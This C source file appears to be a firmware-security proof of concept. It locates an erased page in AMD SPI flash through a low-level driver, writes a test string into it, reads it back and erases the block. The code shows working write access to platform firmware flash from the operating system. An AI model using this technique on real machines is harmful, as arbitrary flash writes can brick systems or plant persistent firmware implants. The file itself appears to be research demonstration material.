#include "global.h"
#include "pci.h"
#include "common_chipset.h"
#include "Util.h"
#include "physmem.h"
#include "msr.h"
#include "smm_communicate.h"
#include "smi.h"
#include "amd_psp.h"

UINT32 spi_flash_unused_page()
{

	UINT64 flash_base = 0xFD00000000;
	UINT32 flash_size = 32 * 1024 * 1024;

	void *mem = calloc(1, PAGE_SIZE);
	memset(mem, 0xff, PAGE_SIZE);
	UINT32 offset = 0;
	for (int i = 0; i < flash_size; i += PAGE_SIZE)
	{
		void *p = map_physical_memory(flash_base + i, PAGE_SIZE);
		// printf("%lx\n", flash_base+i);
		if (memcmp(mem, p, PAGE_SIZE) == 0)
		{
			offset = i;

			unmap_physical_memory(p, PAGE_SIZE);
			break;
		}
		unmap_physical_memory(p, PAGE_SIZE);
	}
	printf("Found unused page at: %08x\n", offset);
	free(mem);
	return offset;
}

UINT32 spi_flash_list_unused_pages()
{

	UINT64 flash_base = 0xFD00000000;
	UINT32 flash_size = 32 * 1024 * 1024;

	void *mem = calloc(1, PAGE_SIZE*1);
	memset(mem, 0xff, PAGE_SIZE);
	UINT32 offset = 0;
	for (int i = 0; i < flash_size; i += PAGE_SIZE)
	{
		void *p = map_physical_memory(flash_base + i, PAGE_SIZE);
		// printf("%lx\n", flash_base+i);
		if (memcmp(mem, p, PAGE_SIZE) == 0)
		{
			offset = i;
			printf("offset: 0x%llx\n", offset);
			unmap_physical_memory(p, PAGE_SIZE);
			continue;
		}
		unmap_physical_memory(p, PAGE_SIZE);
	}
	//printf("Found unused page at: %08x\n", offset);
	free(mem);
	return offset;
}


void proof_of_concept2()
{
	amd_retrieve_chipset_information();

	BYTE *mem = (BYTE *)calloc(1, 4096);

	UINT32 target_fla = spi_flash_unused_page();

	read_from_flash_index_mode(NULL, target_fla, 4096, mem);
	print_memory(0xFD00000000 + target_fla, (char *)mem, 0x100);
	getchar();

	const char msg[] = "This is clearly not a gibson";

	amd_spi_write_buffer(NULL, target_fla, (BYTE *) msg, strlen(msg));

	memset(mem, 0x00, PAGE_SIZE);

	read_from_flash_index_mode(NULL, target_fla, 4096, mem);
	print_memory(0xFD00000000 + target_fla, (char *)mem, 0x100);
	getchar();
	amd_spi_erase_4k_block(NULL, target_fla);

	read_from_flash_index_mode(NULL, target_fla, 4096, mem);
	print_memory(0xFD00000000 + target_fla, (char *)mem, 0x100);
	getchar();

	free(mem);
}


int main(int argc, char **argv)
{
	open_platbox_device();

    proof_of_concept2();
	close_platbox_device();

	return 0;
}